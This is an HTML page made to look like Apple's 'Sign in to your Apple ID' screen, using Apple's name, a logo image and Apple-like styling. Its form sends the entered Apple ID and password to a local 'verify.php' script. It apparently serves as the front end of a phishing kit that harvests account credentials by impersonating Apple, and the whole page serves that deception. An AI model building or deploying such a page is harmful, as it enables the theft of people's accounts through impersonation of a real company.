<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Apple ID - Sign In</title>
    <link rel="icon" type="image/x-icon" href="favicon.ico">
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f5f5f7;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .container {
            text-align: center;
        }

        .input-group {
            margin-bottom: 20px;
        }

        .input-group label {
            display: block;
            margin-bottom: 5px;
        }

        .input-group input {
            width: 100%;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 5px;
            outline: none;
            text-transform: uppercase;
        }

        button {
            width: 100px;
            padding: 10px;
            background-color: #0071e3;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }

        button:hover {
            background-color: #005bb5;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <img src="apple-logo.png" alt="Apple Logo" class="logo">
            <h1>Sign in to your Apple ID</h1>
        </header>
        <main>
            <form action="verify.php" method="post">
                <div class="input-group">
                    <label for="apple-id">Apple ID</label>
                    <input type="text" id="apple-id" name="apple-id" required>
                </div>
                <div class="input-group">
                    <label for="password">Password</label>
                    <input type="password" id="password" name="password" required>
                </div>
                <button type="submit">Sign In</button>
            </form>
            <p class="forgot">
                <a href="#">Forgot Apple ID or password?</a>
            </p>
        </main>
    </div>
</body>
</html>
